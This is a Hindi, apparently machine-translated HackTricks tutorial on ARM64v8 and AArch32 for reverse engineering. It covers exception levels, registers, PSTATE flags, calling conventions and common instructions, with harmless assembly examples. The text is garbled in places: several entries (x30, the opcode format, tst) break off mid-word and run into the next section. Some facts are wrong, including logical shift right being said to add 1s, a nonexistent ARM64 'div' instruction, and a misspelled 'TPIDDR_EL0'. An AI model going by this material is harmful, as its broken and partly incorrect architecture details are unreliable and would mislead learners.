# ARM64v8 का परिचय

{% hint style="success" %}
AWS हैकिंग सीखें और अभ्यास करें:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks प्रशिक्षण AWS रेड टीम विशेषज्ञ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP हैकिंग सीखें और अभ्यास करें: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks प्रशिक्षण GCP रेड टीम विशेषज्ञ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>हैकट्रिक्स का समर्थन करें</summary>

* [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जाँच करें!
* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या हमें **ट्विटर** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** पर **फॉलो** करें।
* **हैकिंग ट्रिक्स साझा करें, हैकट्रिक्स**](https://github.com/carlospolop/hacktricks) और [**हैकट्रिक्स क्लाउड**](https://github.com/carlospolop/hacktricks-cloud) github रेपो में PR जमा करके।

</details>
{% endhint %}

## **अपवाद स्तर - EL (ARM64v8)**

ARMv8 वास्तुकला में, अभिव्यक्ति स्तर, जिन्हें अपवाद स्तर (ELs) के रूप में जाना जाता है, निष्पादन पर्यावरण की विशेषाधिकार स्तर और क्षमताएँ परिभाषित करते हैं। चार अपवाद स्तर हैं, EL0 से EL3 तक, प्रत्येक एक विभिन्न उद्देश्य की सेवा करते हैं:

1. **EL0 - उपयोगकर्ता मोड**:
* यह सबसे कम विशेषाधिकृत स्तर है और सामान्य एप्लिकेशन कोड को निष्पादित करने के लिए उपयोग किया जाता है।
* EL0 पर चल रहे एप्लिकेशन एक-दूसरे से और सिस्टम सॉफ़्टवेयर से अलग होते हैं, जो सुरक्षा और स्थिरता को बढ़ावा देता है।
2. **EL1 - ऑपरेटिंग सिस्टम कर्नेल मोड**:
* अधिकांश ऑपरेटिंग सिस्टम कर्नल इस स्तर पर चलते हैं।
* EL1 में EL0 से अधिक विशेषाधिकार होते हैं और सिस्टम संसाधनों तक पहुंच सकते हैं, लेकिन सिस्टम अखंडता सुनिश्चित करने के लिए कुछ प्रतिबंध होते हैं।
3. **EL2 - हाइपरवाइजर मोड**:
* यह स्तर वर्चुअलाइजेशन के लिए उपयोग किया जाता है। EL2 पर चल रहा एक हाइपरवाइजर एक ही भौतिक हार्डवेयर पर चल रहे कई ऑपरेटिंग सिस्टम (प्रत्येक अपने खुद के EL1 में) का प्रबंधन कर सकता है।
* EL2 वर्चुअलाइजेशनीय पर्यावरणों की अलगाव और नियंत्रण की सुविधाएँ प्रदान करता है।
4. **EL3 - सुरक्षित मॉनिटर मोड**:
* यह सबसे अधिक विशेषाधिकृत स्तर है और अक्सर सुरक्षित बूटिंग और विश्वसनीय निष्पादन पर्यावरणों के लिए उपयोग किया जाता है।
* EL3 सुरक्षित और गैर-सुरक्षित स्थितियों के बीच पहुंच और नियंत्रण को प्रबंधित कर सकता है (जैसे सुरक्षित बूट, विश्वसनीय ओएस, आदि)।

इन स्तरों का उपयोग विभिन्न प्रणाली के विभिन्न पहलुओं को प्रबंधित करने के लिए एक संरचित और सुरक्षित तरीके से अनुमति देता है, उपयोगकर्ता एप्लिकेशन से सबसे अधिक विशेषाधिकृत सिस्टम सॉफ़टवेयर तक। ARMv8 का विशेषाधिकार स्तरों का दृष्टिकोण विभिन्न सिस्टम घटकों को प्रभावी ढंग से अलग करने में मदद करता है, जिससे सिस्टम की सुरक्षा और मजबूती में वृद्धि होती है।

## **रजिस्टर (ARM64v8)**

ARM64 में **31 सामान्य उद्देश्य रजिस्टर** हैं, `x0` से `x30` तक लेबल किए गए। प्रत्येक एक **64-बिट** (8-बाइट) मान स्टोर कर सकता है। 32-बिट मानों की आवश्यकता वाले ऑपरेशनों के लिए, एक ही रजिस्टरों को 32-बिट मोड में एक्सेस किया जा सकता है जिनके नाम w0 से w30 हैं।

1. **`x0`** से **`x7`** - इन्हें सामान्यत: स्क्रैच रजिस्टर्स के रूप में और सबरूटीन्स को पैरामीटर पास करने के लिए उपयोग किया जाता है।
* **`x0`** एक फ़ंक्शन के रिटर्न डेटा को भी लेता है
2. **`x8`** - लिनक्स कर्नेल में, `x8` `svc` इंस्ट्रक्शन के लिए सिस्टम कॉल नंबर के रूप में उपयोग किया जाता है। **macOS में x16 का उपयोग होता है!**
3. **`x9`** से **`x15`** - अधिक सामान्य रजिस्टर, अक्सर स्थानीय चरों के लिए उपयोग किए जाते हैं।
4. **`x16`** और **`x17`** - **अंतर-प्रक्रियात्मक कॉल रजिस्टर**। तत्काल मूल्यों के लिए अस्थायी रजिस्टर। ये अंधकारित फ़ंक्शन कॉल्स और PLT (Procedure Linkage Table) स्टब्स के लिए भी उपयोग किए जाते हैं।
* **`x16`** **macOS** में **`svc`** इंस्ट्रक्शन के लिए **सिस्टम कॉल नंबर** के रूप में उपयोग किया जाता है।
5. **`x18`** - **प्लेटफ़ॉर्म रजिस्टर**। यह एक सामान्य उद्देश्य रजिस्टर के रूप में उपयोग किया जा सकता है, लेकिन कुछ प्लेटफ़ॉर्मों पर, यह रजिस्टर प्लेटफ़ॉर्म-विशेष उपयोगों के लिए सुरक्षित ओएस में मौजूदा कार्य संरचना के लिए आरक्षित है: विंडोज में वर्तमान धागे पर्यावरण ब्लॉक के लिए पॉइंटर, या लिनक्स कर्नेल में वर्तमान **निष्पादित कार्य संरचना के लिए पॉइंटर** के लिए।
6. **`x19`** से **`x28`** - ये कॉली-सेव्ड रजिस्टर हैं। एक फ़ंक्शन को इन रजिस्टरों के मानों को अपने कॉलर के लिए संरक्षित रखना चाहिए, इसलिए वे स्टैक में स्टोर किए जाते हैं और कॉलर के पास जाने से पहले पुनः प्राप्त किए जाते हैं।
7. **`x29`** - **फ्रेम पॉइंटर** स्टैक फ्रेम का ट्रैक रखने के लिए। जब एक नया स्टैक फ्रेम बनाया जाता है क्योंकि एक फ़ंक्शन को कॉल किया जाता है, तो **`x29`** रजिस्टर को स्टैक में स्टोर किया जाता है और नया फ्रेम पॉइंटर पता (**`sp`** पता) इस रजिस्ट्री में स्टोर किया जाता है।
* यह रजिस्टर एक **सामान्य उद्देश्य रजिस्टर** के रूप में भी उपयोग किया जा सकता है हालांकि यह आम तौर पर **स्थानीय चरों** के संदर्भ के रूप में उपयोग किया जाता है।
8. **`x30`** या **
### सिस्टम रजिस्टर

**सैकड़ों सिस्टम रजिस्टर** होते हैं, जिन्हें विशेष उद्देश्य रजिस्टर (SPRs) भी कहा जाता है, जो **प्रोसेसर** के व्यवहार को **निगरानी** और **नियंत्रण** के लिए उपयोग किया जाता है।\
इन्हें केवल विशेष निर्दिष्ट निर्देश का उपयोग करके पढ़ा या सेट किया जा सकता है **`mrs`** और **`msr`**।

विशेष रजिस्टर **`TPIDR_EL0`** और **`TPIDDR_EL0`** जब रिवर्स इंजीनियरिंग किया जाता है, तो आमतौर पर पाया जाता है। `EL0` सूफ़िक्स इसका संकेत करता है कि रजिस्टर तक पहुंचा जा सकता है किसी **न्यूनतम अपवाद** से (इस मामले में EL0 नियमित अपवाद (विशेषाधिकार) स्तर है जिसमें नियमित कार्यक्रम चलते हैं)।\
इन्हें अक्सर **स्थानीय संग्रहण क्षेत्र** के **आधार पता** को संग्रहित करने के लिए उपयोग किया जाता है। सामान्यत: पहला पढ़ने और लिखने के लिए उपयुक्त होता है, लेकिन दूसरा EL0 से पढ़ा जा सकता है और EL1 से लिखा जा सकता है (जैसे कर्नेल)।

* `mrs x0, TPIDR_EL0 ; TPIDR_EL0 को x0 में पढ़ें`
* `msr TPIDR_EL0, X0 ; x0 को TPIDR_EL0 में लिखें`

### **PSTATE**

**PSTATE** में कई प्रक्रिया घटक होते हैं जो ऑपरेटिंग-सिस्टम-दृश्य **`SPSR_ELx`** विशेष रजिस्टर में संग्रहीत होते हैं, जो ट्रिगर किए गए अपवाद के **अनुमति स्तर** X होता है (यह अपवाद समाप्त होने पर प्रक्रिया स्थिति को पुनर्प्राप्त करने की अनुमति देता है)।\
ये पहुंचने योग्य क्षेत्र हैं:

<figure><img src="../../../.gitbook/assets/image (1196).png" alt=""><figcaption></figcaption></figure>

* **`N`**, **`Z`**, **`C`** और **`V`** स्थिति ध्वज:
* **`N`** का अर्थ है कि ऑपरेशन नकारात्मक परिणाम दिया
* **`Z`** का अर्थ है कि ऑपरेशन शून्य परिणाम दिया
* **`C`** का अर्थ है कि ऑपरेशन ले जाता है
* **`V`** का अर्थ है कि ऑपरेशन एक साइन ओवरफ्लो दिया:
* दो सकारात्मक संख्याओं का योगदान एक नकारात्मक परिणाम देता है।
* दो नकारात्मक संख्याओं का योगदान एक सकारात्मक परिणाम देता है।
* घटना घटना, जब एक बड़ी नकारात्मक संख्या से एक छोटी सकारात्मक संख्या को घटाया जाता है (या उल्टा), और परिणाम दिए गए बिट आकार की सीमा के भीतर प्रतिनिधित नहीं किया जा सकता है।
* स्वाभाविक रूप से प्रोसेसर को यह नहीं पता कि ऑपरेशन साइन है या नहीं, इसलिए यह C और V की जांच करेगा ऑपरेशन में और यह सूचित करेगा कि यदि एक कैरी हुई थी यदि यह साइन था या असाइन।

{% hint style="warning" %}
सभी निर्देश इन ध्वजों को अपडेट नहीं करते। कुछ जैसे **`CMP`** या **`TST`** करते हैं, और अन्य जिनका s सफ़िक्स है जैसे **`ADDS`** भी ऐसा करते हैं।
{% endhint %}

* वर्तमान **रजिस्टर चौड़ाई (`nRW`)** ध्वज: यदि ध्वज मान 0 में है, तो कार्यक्रम AArch64 निष्पादन स्थिति में चलेगा जब फिर से आरंभ होगा।
* वर्तमान **अपवाद स्तर** (**`EL`**): EL0 में चल रहे एक नियमित कार्यक्रम का मान 0 होगा
* **एकल कदम चलाने** का ध्वज (**`SS`**): डीबगर्स द्वारा एकल कदम चलाने के लिए उपयोग किया जाता है जब एक अपवाद के माध्यम से **`SPSR_ELx`** में SS ध्वज को 1 सेट करके। कार्यक्रम एक कदम चलाएगा और एक एकल कदम अपवाद जारी करेगा।
* अवैध अपवाद स्थिति ध्वज (**`IL`**): यह चिह्नित करने के लिए उपयोग किया जाता है जब एक विशेषाधिकार सॉफ़्टवेयर एक अवैध अपवाद स्तर स्थानांतरण करता है, यह ध्वज 1 में सेट किया जाता है और प्रोसेसर एक अवैध स्थिति अपवाद ट्रिगर करता है।
* **`DAIF`** ध्वज: ये ध्वज एक विशेषाधिकार कार्यक्रम को विविध बाह्य अपवादों को वैकल्पिक रूप से मास्क करने की अनुमति देते हैं।
* यदि **`A`** 1 है तो यह अर्धसंगत अबॉर्ट्स को ट्रिगर करेगा। **`I`** बाह्य हार्डवेयर **इंटरप्ट अनुरोधों** (IRQs) का प्रतिक्रिया करने के लिए कॉन्फ़िगर करता है। और F **फास्ट इंटरप्ट अनुरोधों** (FIRs) से संबंधित है।
* **स्टैक प्वाइंटर सेलेक्ट** ध्वज (**`SPS`**): EL1 और इसके ऊपर चल रहे विशेषाधिकार कार्यक्रम अपने स्वयं के स्टैक प्वाइंटर रजिस्टर और उपयोगकर्ता मॉडल वाले के बीच ट्रांसफर कर सकते हैं (जैसे `SP_EL1` और `EL0` के बीच)। यह परिवर्तन EL0 से नहीं किया जा सकता।

## **कॉलिंग कनवेंशन (ARM64v8)**

ARM64 कॉलिंग कनवेंशन निर्दिष्ट करता है कि **पहले आठ पैरामीटर** एक फ़ंक्शन में **रजिस्टर्स `x0` से `x7`** के माध्यम से पारित किए जाते हैं। **अतिरिक्त** पैरामीटर **स्टैक** पर पारित किए जाते हैं। **वापसी** मान रजिस्टर **`x0`** में वापस पारित किया जाता है, या **यदि यह 128 बिट लंबा है** तो **`x1`** में भी। **`x19`** से **`x30`** और **`sp`** रजिस्टर को फ़ंक्शन कॉल के बीच सुरक्षित रखना चाहिए।

एक फ़ंक्शन को असेंबली में पढ़ते समय, **फ़ंक्शन प्रोलॉग और एपिलॉग** के लिए देखें। **प्रोलॉग** आमतौर पर **फ्रेम पॉइंटर को सहेजना (`x29`)**, **नया फ्रेम पॉइंटर सेट** करना, और **स्टैक स्थान** आवंटित करना शामिल होता है। **एपिलॉग** आमतौर पर **सहेजे गए फ्रेम पॉइंटर को पुनर्स्थापित** करना और **फ़ंक्शन से वापस** लौटना शामिल होता है।

### स्विफ्ट में कॉलिंग कनवेंशन

स्विफ्ट का अपना **कॉलिंग कनवेंशन** होता है जो [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64) में पाया जा सकता है।

## **सामान्य निर्देश (ARM64v8)**

ARM64 निर्देशों का सामान्य रूप से **स्वरूप `ऑपकोड dst, src1, src2`** होता है, जहां **`ऑपकोड`** वह **ऑपरेशन** होता है जो किया जाना है (जैसे `जोड़ें`, `घटाएं`, `मूव`, आ
* वाक्याकार: add(s) Xn1, Xn2, Xn3 | #imm, \[shift #N | RRX]
* Xn1 -> गंतव्य
* Xn2 -> ऑपरेंड 1
* Xn3 | #imm -> ऑपरेंड 2 (रजिस्टर या तत्काल)
* \[shift #N | RRX] -> शिफ्ट करें या RRX को कॉल करें
* उदाहरण: `add x0, x1, x2` — यह `x1` और `x2` में मानों को जोड़ता है और परिणाम को `x0` में संग्रहित करता है।
* `add x5, x5, #1, lsl #12` — यह 4096 के बराबर है (1 को 12 बार शिफ्ट करने पर) -> 1 0000 0000 0000 0000
* **`adds`** यह एक `add` करता है और ध्वज अपडेट करता है
* **`sub`**: दो रजिस्टरों के मानों को कम करें और परिणाम को एक रजिस्टर में संग्रहित करें।
* **`add`** की **सिंटेक्स** की जाँच करें।
* उदाहरण: `sub x0, x1, x2` — यह `x1` से `x2` की मानों को घटाता है और परिणाम को `x0` में संग्रहित करता है।
* **`subs`** यह सब की तरह है लेकिन ध्वज को अपडेट करता है
* **`mul`**: दो रजिस्टरों के मानों को **गुणा** करें और परिणाम को एक रजिस्टर में संग्रहित करें।
* उदाहरण: `mul x0, x1, x2` — यह `x1` और `x2` में मानों को गुणा करता है और परिणाम को `x0` में संग्रहित करता है।
* **`div`**: एक रजिस्टर की मान को दूसरे द्वारा विभाजित करें और परिणाम को एक रजिस्टर में संग्रहित करें।
* उदाहरण: `div x0, x1, x2` — यह `x1` में मान को `x2` से विभाजित करता है और परिणाम को `x0` में संग्रहित करता है।
* **`lsl`**, **`lsr`**, **`asr`**, **`ror`, `rrx`**:
* **तार्किक शिफ्ट बाएं**: अंत से 0 जोड़ें और अन्य बिट्स को आगे ले जाएं (n बार 2 से गुणा)
* **तार्किक शिफ्ट दाएं**: शुरुआत में 1 जोड़ें और अन्य बिट्स को पिछले बार वापस ले जाएं (अप्रमाणित में n बार 2 से विभाजित)
* **अंकगणित शिफ्ट दाएं**: **`lsr`** की तरह, लेकिन यदि सबसे महत्वपूर्ण बिट 1 है, \*\*1s जोड़े जाते हैं (\*\*अंकगणित में n बार 2 से विभाजित)
* **दाएं घुमाएं**: **`lsr`** की तरह, लेकिन जो कुछ भी दाएं से हटाया जाता है, वह बाएं में जोड़ा जाता है
* **विस्तार के साथ दाएं घुमाएं**: **`ror`** की तरह, लेकिन कैरी ध्वज को "सबसे महत्वपूर्ण बिट" के रूप में ले जाया जाता है। इसलिए कैरी ध्वज को बिट 31 और हटाए गए बिट को कैरी ध्वज में स्थानांतरित किया जाता है।
* **`bfm`**: **बिट फाइल्ड मूव**, ये ऑपरेशन **एक मान से बिट `0...n`** की प्रतिलिपि बनाते हैं और उन्हें स्थानों **`m..m+n`** में रखते हैं। **`#s`** बाएं सबसे अधिक बिट स्थिति और **`#r`** दाएं घुमाने की मात्रा को निर्दिष्ट करता है।
* बिटफाइल्ड मूव: `BFM Xd, Xn, #r`
* साइन बिटफील्ड मूव: `SBFM Xd, Xn, #r, #s`
* असाइन्ड बिटफील्ड मूव: `UBFM Xd, Xn, #r, #s`
* **बिटफील्ड निकालना और डालना:** एक रजिस्टर से एक बिटफील्ड की प्रतिलिपि बनाएं और उसे दूसरे रजिस्टर में कॉपी करें।
* **`BFI X1, X2, #3, #4`** X2 से 3 वें बिट से 4 बिट डालें X1 में
* **`BFXIL X1, X2, #3, #4`** 3 वें बिट से X2 से चार बिट निकालें और उन्हें X1 में कॉपी करें
* **`SBFIZ X1, X2, #3, #4`** X2 से 4 बिट का साइन विस्तार करें और उन्हें X1 में डालें जो बिट स्थिति 3 से शुरू होती है और दाएं बिट्स को शून्य करते हैं
* **`SBFX X1, X2, #3, #4`** X2 से 3 वें बिट से 4 बिट निकालें, साइन विस्तार करें, और परिणाम को X1 में रखें
* **`UBFIZ X1, X2, #3, #4`** X2 से 4 बिट का शून्य विस्तार करें और उन्हें X1 में डालें जो बिट स्थिति 3 से शुरू होती है और दाएं बिट्स को शून्य करते हैं
* **`UBFX X1, X2, #3, #4`** X2 से 3 वें बिट से 4 बिट निकालें और उन्हें X1 में शून्य विस्तारित परिणाम में रखें।
* **चिह्न विस्तार करें तक X:** एक मान का साइन विस्तार करता है (या केवल 0s जोड़ता है असाइन्ड संस्करण में) उसके साथ कार्रवाई करने के लिए:
* **`SXTB X1, W2`** W2 से X1 तक एक बाइट के साइन को विस्तारित करता है (`W2` `X2` का आधा है) 64 बिट भरने के लिए
* **`SXTH X1, W2`** W2 से X1 तक 16 बिट नंबर का साइन विस्तार करता है 64 बिट भरने के लिए
* **`SXTW X1, W2`** W2 से X1 तक एक बाइट के साइन को विस्तारित करता है 64 बिट भरने के लिए
* **`UXTB X1, W2`** एक बाइट को 0s जोड़ता है (असाइन्ड) W2 से X1 तक 64 बिट भरने के लिए
* **`extr`:** एक निर्दिष्ट **जोड़े गए रजिस्टरों से बिट निकालता है**।
* उदाहरण: `EXTR W3, W2, W1, #3` यह **W1+W2** को **W2 के 3 वें बिट से W1 के 3 वें बिट तक** लेता है और इसे W3 में संग्रहित करता है।
* **`cmp`**: दो रजिस्टरों की तुलना करें और स्थिति ध्वज सेट करें। यह एक **`subs`** का **उपनाम** है जो गंतव्य रजिस्टर को शून्य रजिस्टर पर सेट करता है। `m == n` के बारे में जानने के लिए उपयुक्त है।
* यह **`subs`** के समान सिंटेक्स का समर्थन करता है
* उदाहरण: `cmp x0, x1` — यह `x0` और `x1` में मानों की तुलना करता है और अनुसार स्थिति ध्वज सेट करता है।
* **`cmn`**: **असंतुलन** ऑपरेंड। इस मामले में यह एक **`adds`** का **उपनाम** है और एक ही सिंटेक्स का समर्थन करता है। `m == -n` के बारे में जानने के लिए उपयुक्त है।
* **`ccmp`**: शर्तमय तुलना, यह एक तुलना है जो केवल यदि पिछली तुलना सत्य थी और विशेष रूप से nzcv बिट सेट करेगी।
* `cmp x1, x2; ccmp x3, x4, 0, NE; blt _func` -> यदि x1 != x2 और x3 < x4, _func पर जाएं
* यह इसलिए है क्योंकि **`ccmp`** केवल उस समय निष्पादित किया जाएगा जब **पिछली `cmp` एक `NE` था**, अगर यह नहीं था तो बिट `nzcv` को 0 पर सेट किया जाएगा (जो `blt` तुलना को संतुष्ट नहीं करेगा)।
* इसे `ccmn` के रूप में भी उपयोग किया जा सकता है (वही लेकिन नकारात्मक, जैसे `cmp` vs `cmn`।)
* **`tst`**: यह जांचता है कि तुल
* **`b.ne`**: **ब्रांच अगर बराबर नहीं**। यह निर्धारित ध्वज (जो पिछले तुलना निर्देश द्वारा सेट किए गए थे) की स्थिति की जांच करता है, और यदि तुलना की गई मान समान नहीं थे, तो यह एक लेबल या पते पर ब्रांच करता है।
* उदाहरण: `cmp x0, x1` निर्देश के बाद, `b.ne label` — यदि `x0` और `x1` में मान समान नहीं थे, तो यह `label` पर जाता है।
* **`cbz`**: **जीरो पर तुलना और ब्रांच**। यह निर्देश एक रजिस्टर को शून्य के साथ तुलना करता है, और यदि वे समान हैं, तो यह एक लेबल या पते पर ब्रांच करता है।
* उदाहरण: `cbz x0, label` — यदि `x0` में मान शून्य है, तो यह `label` पर जाता है।
* **`cbnz`**: **जीरो पर तुलना और ब्रांच नॉन-जीरो**। यह निर्देश एक रजिस्टर को शून्य के साथ तुलना करता है, और यदि वे समान नहीं हैं, तो यह एक लेबल या पते पर ब्रांच करता है।
* उदाहरण: `cbnz x0, label` — यदि `x0` में मान गैर-शून्य है, तो यह `label` पर जाता है।
* **`tbnz`**: टेस्ट बिट और ब्रांच ऑन नॉनजीरो
* उदाहरण: `tbnz x0, #8, label`
* **`tbz`**: टेस्ट बिट और ब्रांच ऑन जीरो
* उदाहरण: `tbz x0, #8, label`
* **शर्ताधीन चयन कार्याएँ**: ये कार्याएँ वे हैं जिनका व्यवहार शर्ताधीन बिट्स पर निर्भर करता है।
* `csel Xd, Xn, Xm, cond` -> `csel X0, X1, X2, EQ` -> यदि सत्य, X0 = X1, अगर झूठ, X0 = X2
* `csinc Xd, Xn, Xm, cond` -> यदि सत्य, Xd = Xn, अगर झूठ, Xd = Xm + 1
* `cinc Xd, Xn, cond` -> यदि सत्य, Xd = Xn + 1, अगर झूठ, Xd = Xn
* `csinv Xd, Xn, Xm, cond` -> यदि सत्य, Xd = Xn, अगर झूठ, Xd = NOT(Xm)
* `cinv Xd, Xn, cond` -> यदि सत्य, Xd = NOT(Xn), अगर झूठ, Xd = Xn
* `csneg Xd, Xn, Xm, cond` -> यदि सत्य, Xd = Xn, अगर झूठ, Xd = - Xm
* `cneg Xd, Xn, cond` -> यदि सत्य, Xd = - Xn, अगर झूठ, Xd = Xn
* `cset Xd, Xn, Xm, cond` -> यदि सत्य, Xd = 1, अगर झूठ, Xd = 0
* `csetm Xd, Xn, Xm, cond` -> यदि सत्य, Xd = \<all 1>, अगर झूठ, Xd = 0
* **`adrp`**: **एक प्रतीक का पृष्ठ पता** गणना करें और इसे एक रजिस्टर में संग्रहीत करें।
* उदाहरण: `adrp x0, symbol` — यह `symbol` का पृष्ठ पता गणना करता है और `x0` में संग्रहीत करता है।
* **`ldrsw`**: मेमोरी से एक साइन एक्सटेंडेड 64 बिट तक का साइन्ड **32-बिट** मान **लोड** करें।
* उदाहरण: `ldrsw x0, [x1]` — यह `x1` द्वारा संकेतित मेमोरी स्थान से एक साइन्ड 32-बिट मान लोड करता है, इसे 64 बिट तक साइनएक्सटेंड करता है, और इसे `x0` में संग्रहीत करता है।
* **`stur`**: **एक रजिस्टर मान को मेमोरी स्थान पर स्टोर करें**, एक अन्य रजिस्टर से एक ऑफसेट का उपयोग करके।
* उदाहरण: `stur x0, [x1, #4]` — यह `x1` में वर्तमान मेमोरी पते से 4 बाइट अधिक होने वाले पते में मान को स्टोर करता है।
* **`svc`** : **सिस्टम कॉल** करें। यह "सुपरवाइजर कॉल" के लिए खड़ा है। जब प्रोसेसर इस निर्देश को निष्पादित करता है, तो यह **उपयोगकर्ता मोड से कर्णेल मोड** में स्विच करता है और मेमोरी में एक विशिष्ट स्थान पर जाता है जहां **कर्णेल की सिस्टम कॉल हैंडलिंग** कोड स्थित है।
*   उदाहरण:

```armasm
mov x8, 93  ; निकासी (93) के लिए सिस्टम कॉल नंबर को रजिस्टर x8 में लोड करें।
mov x0, 0   ; निकासी स्थिति कोड (0) को रजिस्टर x0 में लोड करें।
svc 0       ; सिस्टम कॉल करें।
```

### **कार्य का प्रोलॉग**

1. **लिंक रजिस्टर और फ्रेम प्वाइंटर को स्टैक में सहेजें**:

{% code overflow="wrap" %}
```armasm
stp x29, x30, [sp, #-16]!  ; store pair x29 and x30 to the stack and decrement the stack pointer
```
{% endcode %}

2. **नए फ्रेम पॉइंटर सेट करें**: `mov x29, sp` (वर्तमान फ़ंक्शन के लिए नए फ्रेम पॉइंटर सेट करता है)
3. **स्थानीय चर के लिए स्टैक पर स्थान आवंटित करें** (यदि आवश्यक हो): `sub sp, sp, <size>` (जहां `<size>` आवश्यक बाइट्स की संख्या है)

### **फ़ंक्शन एपिलॉग**

1. **स्थानीय चरों को डीएलीक्वेट करें (यदि कोई आवंटित किए गए हो)**: `add sp, sp, <size>`
2. **लिंक रजिस्टर और फ्रेम पॉइंटर को पुनर्स्थापित करें**:

{% code overflow="wrap" %}
```armasm
ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
```
{% endcode %}

3. **वापसी**: `ret` (लिंक रजिस्टर में पते का उपयोग करके कॉलर को नियंत्रण वापस करता है)

## AARCH32 निष्पादन स्थिति

Armv8-A 32-बिट कार्यक्रमों का निष्पादन समर्थन करता है। **AArch32** एक **दो निर्देश सेट** में चल सकता है: **`A32`** और **`T32`** और **`इंटरवर्किंग`** के माध्यम से उनमें स्विच कर सकता है।\
**विशेषाधिकारी** 64-बिट कार्यक्रम 32-बिट के निम्न विशेषाधिकारी में एक अपवाद स्तर स्थानांतरण का अनुसूचित कर सकते हैं।\
ध्यान दें कि 64-बिट से 32-बिट पराधीनता स्तर कम करने के साथ होता है (उदाहरण के लिए, EL1 में एक 64-बिट कार्यक्रम एल0 में एक कार्यक्रम को ट्रिगर कर रहा है)। यह किया जाता है **`SPSR_ELx`** विशेष रजिस्टर के **बिट 4 को 1** सेट करके जब `AArch32` प्रक्रिया धागा निष्पादित होने के लिए तैयार होता है और बाकी `SPSR_ELx` में **`AArch32`** कार्यक्रम CPSR को संग्रहित करता है। फिर, विशेषाधिकारी प्रक्रिया **`ERET`** निर्देश को कॉल करती है ताकि प्रोसेसर **`AArch32`** में परिवर्तित हो जाए जो CPSR के आधार पर A32 या T32 में प्रवेश करता है\*\*.\*\*

**`इंटरवर्किंग`** J और T बिट्स का उपयोग करके होता है। `J=0` और `T=0` का मतलब है **`A32`** और `J=0` और `T=1` का मतलब है **T32**। यह मूल रूप से इसे दर्शाता है कि निर्देश सेट T32 है।\
यह **इंटरवर्किंग शाखा निर्देशों** के दौरान सेट किया जाता है, लेकिन PC को गंतव्य रजिस्टर के रूप में सेट किया जा सकता है। उदाहरण:

एक और उदाहरण:
```armasm
_start:
.code 32                ; Begin using A32
add r4, pc, #1      ; Here PC is already pointing to "mov r0, #0"
bx r4               ; Swap to T32 mode: Jump to "mov r0, #0" + 1 (so T32)

.code 16:
mov r0, #0
mov r0, #8
```
### रजिस्टर

16 32-बिट रजिस्टर हैं (r0-r15). **r0 से r14** वे **किसी भी ऑपरेशन** के लिए उपयोग किए जा सकते हैं, हालांकि कुछ उनमें से सामान्यत: आरक्षित होते हैं:

* **`r15`**: कार्यक्रम काउंटर (हमेशा). अगले निर्देश का पता रखता है। A32 में current + 8, T32 में, current + 4।
* **`r11`**: फ्रेम पॉइंटर
* **`r12`**: इंट्रा-प्रोसेडरियल कॉल रजिस्टर
* **`r13`**: स्टैक पॉइंटर
* **`r14`**: लिंक रजिस्टर

इसके अतिरिक्त, रजिस्टर **`बैंक्ड रजिस्ट्रीज`** में बैकअप किए जाते हैं। ये जगह हैं जो रजिस्टर मानों को संग्रहीत करती हैं जो अपशिष्ट हैं, अपशिष्ट संभालन और विशेषाधिकारीय कार्यों में त्वरित संदर्भ परिवर्तन करने की अनुमति देती हैं ताकि हर बार रजिस्टर सहेजने और पुनर्स्थापित करने की आवश्यकता न हो।\
यह **`CPSR`** से प्रोसेसर मोड के **`SPSR`** में प्रोसेसर स्थिति को सहेजने के द्वारा किया जाता है जिसे अपशिष्ट लिया जाता है। अपशिष्ट वापसी पर, **`CPSR`** को **`SPSR`** से पुनर्स्थापित किया जाता है।

### CPSR - वर्तमान कार्यक्रम स्थिति रजिस्टर

AArch32 में CPSR AArch64 में **`PSTATE`** के रूप में काम करता है और एक अपशिष्ट लिया जाता है तो बाद में निष्पादन को पुनर्स्थापित करने के लिए **`SPSR_ELx`** में भी संग्रहीत होता है:

<figure><img src="../../../.gitbook/assets/image (1197).png" alt=""><figcaption></figcaption></figure>

क्षेत्रों को कुछ समूहों में विभाजित किया गया है:

* एप्लिकेशन प्रोग्राम स्थिति रजिस्टर (APSR): अंकगणित ध्वज और EL0 से पहुंचने योग्य।
* निष्पादन स्थिति रजिस्टर: प्रक्रिया व्यवहार (ओएस द्वारा प्रबंधित)।

#### एप्लिकेशन प्रोग्राम स्थिति रजिस्टर (APSR)

* **`N`**, **`Z`**, **`C`**, **`V`** ध्वज (जैसे AArch64 में)
* **`Q`** ध्वज: यह 1 पर सेट होता है जब कई विशेषित सीमांकित अंकगणित निर्देश के निष्पादन के दौरान **इंटीजर सैट्यूरेशन होता है**। एक बार यह **`1`** पर सेट हो जाता है, तो यह वह मान बनाए रखेगा जब तक यह मैन्युअल रूप से 0 पर सेट न हो जाए। इसके अतिरिक्त, इसके मान की जांच करने वाला कोई निर्देश नहीं है, इसे मैन्युअल रूप से पढ़कर किया जाना चाहिए।
* **`GE`** (अधिक या बराबर) ध्वज: इसका उपयोग SIMD (Single Instruction, Multiple Data) ऑपरेशन में किया जाता है, जैसे "पैरलल जोड़" और "पैरलल कम"। ये ऑपरेशन एक ही निर्देश में कई डेटा बिंदुओं को प्रसंस्करण करने की अनुमति देते हैं।

उदाहरण के लिए, **`UADD8`** निर्देशन **चार जोड़ों को जोड़ता है** (दो 32-बिट ऑपरेंड से) पैरलल और परिणामों को एक 32-बिट रजिस्टर में संग्रहीत करता है। फिर यह इन परिणामों के आधार पर `APSR` में `GE` ध्वज सेट करता है। प्रत्येक GE ध्वज एक बाइट जोड़ने के लिए एक का संबंधित है, इसका सूचना देता है कि उस बाइट जोड़ने के लिए अतिरिक्त हो गया है।

**`SEL`** निर्देशन इन GE ध्वजों का उपयोग शर्तानुसार क्रियाएँ करने के लिए करता है।

#### निष्पादन स्थिति रजिस्टर

